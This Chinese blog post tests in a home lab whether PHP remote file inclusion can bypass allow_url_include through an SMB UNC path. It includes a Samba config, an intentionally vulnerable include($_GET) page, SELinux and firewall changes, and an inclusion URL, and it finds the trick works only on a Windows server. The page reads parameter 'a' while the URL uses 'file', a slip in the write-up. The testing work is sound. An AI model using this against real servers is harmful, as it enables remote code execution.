---
title: 用SMB绕过php远程文件包含限制的实践测试
date: 2019-05-21 23:26:43
tags:
---

### 前言
看到freebuf上的《[RFI绕过URL包含限制Getshell](https://www.freebuf.com/articles/web/203442.html)》和先知社区上的《[通过SMB造成远程文件包含（双Off情况）](https://xz.aliyun.com/t/5139)》这两篇文章，说是利用SMB协议可以绕过php对远程文件包含的限制。

默认情况下，php.ini当中`allow_url_include`为`off`，是没有办法对一个文件包含漏洞进行远程文件包含的，更何况连`allow_url_fopen`都为`off`。

看完这两篇文章，可以想到PHP肯定是没有考虑到SMB协议`\\192.168.1.1\test.php`这种情况，认为这种情况是本地文件路径，但是在支持SMB客户端的系统下却成了远程文件包含漏洞。

同时我第一时间想到这里用的特性，实际上和[MySQL利用DNS实现注入总结](https://l4yn3.github.io/2019/04/05/MySQL%E5%88%A9%E7%94%A8DNS%E5%AE%9E%E7%8E%B0%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/)是一样的，应该都是在Windows web server下才能触发的漏洞。

### 实际测试
#### 1. 在CentOS 7 下搭建SAMBA服务
SambaA: `192.168.31.140`为Centos 7 的samba服务器

WinWebB: `192.168.31.139`Windows 10 的PHP WEB Server


![](/uploads/smb1.png)

编辑smb配置文件

```
[global]
workgroup = WORKGROUP
server string = Samba Server %v
netbios name = indishell-lab
security = user
map to guest = bad user
name resolve order = bcast host
dns proxy = no
bind interfaces only = yes

[icatest]
path = /var/www/html/pub
writable = no
guest ok = yes
guest only = yes
read only = yes
directory mode = 0555
force user = nobody
~
```

重启smb服务

```
service smb restart
```

发现其他机器访问不到，iptables在作怪，将445和139端口加入白名单

```
iptables -I INPUT 1 -p tcp --dport 445 -j ACCEPT
iptables -I INPUT 1 -p tcp --dport 139 -j ACCEPT
```

在其它机器上nmap查看端口，可以发现445端口了，安装成功。

在另外一台windows 10主机上运行处输入`\\192.168.31.140\icatest\`可以匿名访问。

#### 2. 在SMB共享目录里写入phpinfo测试文件
SambaA共享目录`/var/www/html/pub/`下执行：

```
touch shell.php
```
内容为：

```
<?php
phpinfo();
```

在WinWebB下运行处输入`\\192.168.31.140\icatest\`打开发现共享目录没有内容，可以刚才我们明明写入了`shell.php`。是SecLinux在作怪：

在SambaA命令行输入

```
setenforce 0
```
关闭seclinux发现出现`shell.php`了。

![](/uploads/smb3.png)


### 3. 测试远程文件包含

在WinWebB机器上的web目录里写入php文件`test.php`

```
<?php
include($_GET['a']);
```

接着关闭php.ini的`allow_url_include`为`off`和`allow_url_fopen`

访问`http://localhost/test.php?file=\\192.168.31.140\icatest\shell.php`

文件包含成功。

![](/uploads/smb4.png)

### 4. 更换Web Server平台为Mac

利用smb可以再刚才的WinWebB 的 Windows 10机器上成功的进行了远程文件包含。

我们现在更换Web Server为Mac试一下。

在MacWeb Server C 下同样执行`3`中的操作。

然后访问`http://localhost/test.php?file=\\192.168.31.140\icatest\shell.php`直接报错。

![](/uploads/smb2.png)


### 5. 结论

如同开始所预想的，这个漏洞和[MySQL利用DNS实现注入总结](https://l4yn3.github.io/2019/04/05/MySQL%E5%88%A9%E7%94%A8DNS%E5%AE%9E%E7%8E%B0%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/)一样，还是利用了Windows 平台对于SMB支持的特性。在默认不支持SMB协议的Linux和Unix平台无法利用。

凡事要自己动手测试，才能得到真正结论。

